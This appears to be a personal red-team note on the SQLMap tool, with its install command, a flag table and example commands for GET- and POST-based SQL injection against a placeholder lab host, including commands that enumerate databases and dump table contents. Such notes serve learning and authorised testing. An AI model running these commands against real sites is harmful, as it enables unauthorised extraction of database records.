Tags: #Status/In-Progress #Type/Tool #Context/Web #Context/Redteam

---
## Overview
SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities. Handles detection, fingerprinting, and exploitation — including database enumeration and data extraction.

## Target / Context
Web applications with SQL injection vulnerabilities. Supports GET and POST-based testing. Pairs with Burp Suite to capture and replay requests.

---
## Installation

> [!INFO]- Installation Commands:
> `sudo apt install sqlmap`

---
## Basic Usage

> [!INFO]- Basic Usage:
> `sqlmap -u "http://target.thm/search?id=1"`
> `sqlmap --help`
> `sqlmap --wizard`

---
## Flags & Options

> [!INFO]- Flags & Options:
> | Flag | Description | Example |
> |------|-------------|---------|
> | `-u` | Target URL to test | `-u "http://target.thm/page?id=1"` |
> | `-r` | Read request from a saved file | `-r intercepted_request.txt` |
> | `--dbs` | Enumerate all database names | `sqlmap -u "..." --dbs` |
> | `-D` | Specify database name | `-D database_name` |
> | `--tables` | List tables in specified database | `-D mydb --tables` |
> | `-T` | Specify table name | `-T users` |
> | `--dump` | Dump records from specified table | `-D mydb -T users --dump` |
> | `--level` | Scan depth (1-5) | `--level=5` |
> | `--wizard` | Guided step-by-step mode | `sqlmap --wizard` |

---
## Common Use Cases

### GET-based Testing
Test a URL with a GET parameter. Note: PUT URL IN SINGLE QUOTES.

> [!INFO]- Commands:
> `sqlmap -u "http://target.thm/search?cat=1" --dbs`
> `sqlmap -u "http://target.thm/search?cat=1" -D database_name --tables`
> `sqlmap -u "http://target.thm/search?cat=1" -D database_name -T table_name --dump`
> Note: GET parameters are not always in the URL. Check via: Right Click -> Inspect -> Network -> Submit -> Copy Request URL

### POST-based Testing
Capture a POST request from Burp Suite and save it to a file, then pass it to SQLMap.

> [!INFO]- Commands:
> `sqlmap -r intercepted_request.txt`
> `sqlmap -r intercepted_request.txt --dbs`
> `sqlmap -r intercepted_request.txt -D database_name -T table_name --dump`

---
## Related Concepts
- [[SQL Fundamentals]]
- [[OWASP Top 10 - 2021]]

## Related Techniques
- [[SQL Injection]]

## Related Playbooks
-

---
## References / Images
-
